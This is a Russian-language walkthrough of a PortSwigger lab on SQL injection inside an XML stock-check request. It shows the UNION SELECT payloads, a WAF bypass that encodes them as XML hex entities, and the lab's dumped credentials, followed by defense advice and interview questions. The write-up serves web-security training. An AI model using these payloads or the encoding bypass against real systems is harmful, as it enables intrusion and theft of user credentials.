# 📘 PortSwigger Lab: SQL Injection with Filter Bypass via XML Encoding

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding  
> 🎯 Тема: SQL Injection в XML + обход WAF через XML Entity Encoding

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Что изучаем](#theory)
- [🧩 Ключевая идея](#idea)
- [🔍 Шаг 1 — Находим XML-запрос](#step1)
- [🔍 Шаг 2 — Проверяем, вычисляется ли storeId](#step2)
- [🔍 Шаг 3 — Проверяем UNION SELECT NULL](#step3)
- [🔍 Шаг 4 — Понимаем блокировку WAF](#step4)
- [🔍 Шаг 5 — Обходим WAF через XML encoding](#step5)
- [🔍 Шаг 6 — Определяем количество колонок](#step6)
- [🔍 Шаг 7 — Получаем username и password](#step7)
- [🔍 Шаг 8 — Входим под administrator](#step8)
- [🧩 Использованные payloads](#payloads)
- [🔬 Разбор главного payload](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [❌ Типичные ошибки](#mistakes)
- [💡 Что важно запомнить](#remember)
- [🛡 Защита](#defense)
- [🎓 Вопросы для собеседования](#interview)
- [✅ Чек-лист](#checklist)

---

<a id="goal"></a>

## 🎯 Цель

Найти SQL Injection в функции проверки остатков товара, обойти WAF с помощью XML Entity Encoding, получить учетные данные пользователя `administrator` и войти в его аккаунт.

---

<a id="theory"></a>

## 🧠 Что изучаем

В предыдущих лабораториях SQL Injection чаще находилась в URL, cookies или query string. В этой лаборатории инъекция находится внутри XML-запроса:

```xml
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Главная мысль:

```text
SQL Injection возможна в любом вводе, если этот ввод попадает в SQL-запрос.
```

Формат ввода может быть любым:

```text
URL parameters
Cookies
Headers
JSON
XML
GraphQL
multipart/form-data
```

В этой лаборатории используется XML. Это важно, потому что XML поддерживает сущности, например:

```xml
&#x53;
```

После XML-декодирования это превращается в:

```text
S
```

Поэтому строка:

```xml
&#x53;ELECT
```

на сервере превращается в:

```sql
SELECT
```

---

<a id="idea"></a>

## 🧩 Ключевая идея

WAF анализирует сырой HTTP-запрос и блокирует очевидные SQLi-слова:

```text
UNION
SELECT
FROM
```

Но приложение сначала пропускает XML через XML Parser. XML Parser декодирует сущности, и только потом значение попадает в SQL.

Цепочка выглядит так:

```text
HTTP Request
    ↓
WAF видит закодированный payload
    ↓
XML Parser декодирует payload
    ↓
SQL получает обычный UNION SELECT
    ↓
База выполняет запрос
```

То есть мы не обманываем SQL. Мы обходим слабый WAF, который не нормализует XML перед проверкой.

---

<a id="step1"></a>

## 🔍 Шаг 1 — Находим XML-запрос

В Burp Suite перехватываем запрос проверки остатков товара. Он отправляется на endpoint типа:

```http
POST /product/stock
```

Тело запроса:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Интересное поле:

```xml
<storeId>1</storeId>
```

По описанию лаборатории именно функция проверки остатков уязвима.

---

<a id="step2"></a>

## 🔍 Шаг 2 — Проверяем, вычисляется ли storeId

Меняем:

```xml
<storeId>1</storeId>
```

на:

```xml
<storeId>1+1</storeId>
```

Если ответ изменился и приложение показало остаток для другого магазина, значит SQL вычислил выражение `1+1`.

Пример возможного SQL на сервере:

```sql
SELECT stock
FROM stock
WHERE product_id = 1
AND store_id = 1+1
```

SQL вычисляет:

```text
1+1 = 2
```

Вывод:

```text
storeId попадает в SQL как выражение.
Это сильный признак SQL Injection.
```

---

<a id="step3"></a>

## 🔍 Шаг 3 — Проверяем UNION SELECT NULL

Теперь проверяем, можно ли добавить второй SELECT через UNION.

Payload:

```sql
1 UNION SELECT NULL
```

В XML:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

Результат:

```text
Attack detected
```

Это важный результат. Он не означает, что SQLi нет. Он означает, что запрос заблокировал WAF.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Понимаем блокировку WAF

WAF увидел в сыром запросе очевидные SQLi-ключевые слова:

```text
UNION
SELECT
```

Поэтому он остановил запрос до того, как он дошел до приложения и SQL.

Логика:

```text
1 UNION SELECT NULL
        ↓
WAF видит UNION SELECT
        ↓
Attack detected
```

Если закодировать только одну букву, например:

```xml
1 UNION &#x53;ELECT NULL
```

WAF все равно может заблокировать запрос, потому что видит слово:

```text
UNION
```

Значит кодировать нужно не одну букву, а весь payload.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Обходим WAF через XML encoding

В Burp Repeater выделяем весь payload:

```sql
1 UNION SELECT NULL
```

Дальше используем Hackvertor:

```text
Extensions → Hackvertor → Encode → hex_entities
```

Hackvertor превращает строку в XML hex entities. Примерно так:

```xml
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;
```

WAF больше не видит открытый текст:

```text
UNION SELECT
```

Но XML Parser на сервере декодирует сущности обратно:

```sql
1 UNION SELECT NULL
```

---

<a id="step6"></a>

## 🔍 Шаг 6 — Определяем количество колонок

После XML-кодирования payload проходит, и ответ становится примерно таким:

```text
992 units
null
```

Появление `null` означает, что:

```sql
UNION SELECT NULL
```

успешно выполнился.

Так как сработал один `NULL`, делаем вывод:

```text
Исходный SQL-запрос возвращает одну колонку.
```

Если бы исходный запрос возвращал две колонки, понадобилось бы:

```sql
UNION SELECT NULL,NULL
```

Но здесь достаточно одной.

---

<a id="step7"></a>

## 🔍 Шаг 7 — Получаем username и password

Таблица `users` содержит две нужные колонки:

```text
username
password
```

Но исходный запрос возвращает только одну колонку. Поэтому нельзя использовать:

```sql
UNION SELECT username, password FROM users
```

Это две колонки, и такой запрос не совпадет с количеством колонок исходного запроса.

Нужно склеить логин и пароль в одну строку:

```sql
username || '~' || password
```

Основной payload:

```sql
1 UNION SELECT username || '~' || password FROM users
```

Символ `~` используется как разделитель, чтобы потом легко отличить логин от пароля:

```text
administrator~password
```

Дальше выделяем весь payload и снова кодируем через:

```text
Hackvertor → Encode → hex_entities
```

После отправки получаем ответ:

```text
carlos~534wzu8n0vot9h2k2f7b
wiener~dh20dxulzd2dfo7lnmaw
administrator~x8kjtwv2l0yg43xwehdo
992 units
```

Нужная строка:

```text
administrator~x8kjtwv2l0yg43xwehdo
```

---

<a id="step8"></a>

## 🔍 Шаг 8 — Входим под administrator

Переходим в:

```text
My account
```

Используем найденные учетные данные.

<details>
<summary>🔑 Показать пароль administrator</summary>

```text
Username: administrator
Password: x8kjtwv2l0yg43xwehdo
```

</details>

После входа лаборатория считается решенной.

---

<a id="payloads"></a>

## 🧩 Использованные payloads

Проверка вычисления выражений:

```xml
<storeId>1+1</storeId>
```

Проверка UNION без обхода WAF:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

Результат:

```text
Attack detected
```

Проверка UNION после XML encoding:

```sql
1 UNION SELECT NULL
```

Payload кодируется через:

```text
Hackvertor → Encode → hex_entities
```

Получение пользователей:

```sql
1 UNION SELECT username || '~' || password FROM users
```

Тоже кодируется через:

```text
Hackvertor → Encode → hex_entities
```

---

<a id="breakdown"></a>

## 🔬 Разбор главного payload

Главный payload:

```sql
1 UNION SELECT username || '~' || password FROM users
```

Разбор:

`1` — нормальное значение `storeId`, от которого продолжается SQL-выражение.

`UNION` — объединяет результат исходного SELECT с результатом нашего SELECT.

`SELECT` — начинает наш дополнительный запрос.

`username` — колонка с именем пользователя.

`||` — оператор конкатенации строк.

`'~'` — разделитель между логином и паролем.

`password` — колонка с паролем.

`FROM users` — таблица, где лежат учетные данные.

Итоговая строка выглядит так:

```text
administrator~x8kjtwv2l0yg43xwehdo
```

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Правильная логика была такой:

```text
1. Найти контролируемое поле XML.
2. Проверить, вычисляется ли выражение 1+1.
3. Проверить UNION SELECT NULL.
4. Увидеть Attack detected и понять, что это WAF.
5. Обойти WAF через XML entity encoding.
6. Определить количество колонок.
7. Если колонка одна — склеить username и password.
8. Получить administrator credentials.
```

Главный навык здесь — не просто знать payload, а понимать, где именно находится фильтр:

```text
WAF стоит до XML Parser.
```

Поэтому XML encoding помогает пройти фильтр, а SQL все равно получает нормальный запрос.

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### 1. Кодировать только SELECT

Например:

```xml
1 UNION &#x53;ELECT NULL
```

Может не сработать, потому что WAF все еще видит:

```text
UNION
```

### 2. Не кодировать весь payload

Нужно кодировать всю строку:

```sql
1 UNION SELECT NULL
```

а не только отдельные буквы.

### 3. Сразу читать users

Нельзя начинать с:

```sql
SELECT * FROM users
```

Сначала нужно понять количество колонок и проверить UNION.

### 4. Использовать две колонки

Нельзя:

```sql
UNION SELECT username, password FROM users
```

потому что исходный запрос возвращает одну колонку.

### 5. Забыть про Hackvertor

Вручную кодировать большой payload неудобно и легко ошибиться. Hackvertor делает это быстрее и надежнее.

---

<a id="remember"></a>

## 💡 Что важно запомнить

- SQL Injection бывает не только в URL.
- XML-поля тоже могут попадать в SQL.
- `1+1` помогает понять, вычисляется ли ввод как SQL-выражение.
- `UNION SELECT NULL` нужен для проверки UNION и количества колонок.
- `Attack detected` в этой лабе означает блокировку WAF.
- WAF смотрит на сырой HTTP-запрос.
- XML Parser декодирует entities перед передачей данных дальше.
- XML encoding может скрыть SQLi payload от слабого WAF.
- Если колонка одна, несколько значений нужно склеивать.
- `username || '~' || password` возвращает логин и пароль одной строкой.

---

<a id="defense"></a>

## 🛡 Защита

Правильная защита:

- использовать parameterized queries;
- не собирать SQL через конкатенацию строк;
- валидировать `storeId` как число;
- нормализовать входные данные до проверки WAF;
- проверять XML после декодирования;
- ограничить права database user;
- логировать подозрительные XML payloads;
- не полагаться только на WAF.

Плохая защита:

```text
Просто искать слова UNION и SELECT в сыром HTTP.
```

Такой подход обходится кодированием.

---

<a id="interview"></a>

## 🎓 Вопросы для собеседования

**Почему SQLi возможна в XML?**  
Потому что XML — это только формат передачи данных. Если значение из XML небезопасно вставляется в SQL, возникает SQL Injection.

**Почему `1+1` помогло подтвердить SQLi?**  
Потому что SQL вычислил выражение и вернул результат для другого storeId.

**Почему `UNION SELECT NULL` используют первым?**  
Потому что `NULL` подходит почти к любому типу данных и помогает проверить количество колонок.

**Почему появился `null` в ответе?**  
Потому что наш `UNION SELECT NULL` успешно добавил вторую строку результата.

**Почему нельзя было использовать `username, password`?**  
Потому что исходный запрос возвращал одну колонку, а `username, password` — две.

**Почему XML encoding обошел WAF?**  
Потому что WAF видел закодированный payload, а XML Parser позже декодировал его в обычный SQL.

---

<a id="checklist"></a>

## ✅ Чек-лист

- [x] Найден XML-запрос проверки остатков.
- [x] Найдено поле `storeId`.
- [x] Проверено выражение `1+1`.
- [x] Подтверждено выполнение SQL-выражений.
- [x] Проверен `UNION SELECT NULL`.
- [x] Обнаружена блокировка WAF.
- [x] Payload закодирован через Hackvertor.
- [x] Определено, что колонка одна.
- [x] Получены `username` и `password`.
- [x] Выполнен вход под `administrator`.

---

# ⬆ Наверх

[Вернуться к содержанию](#top)
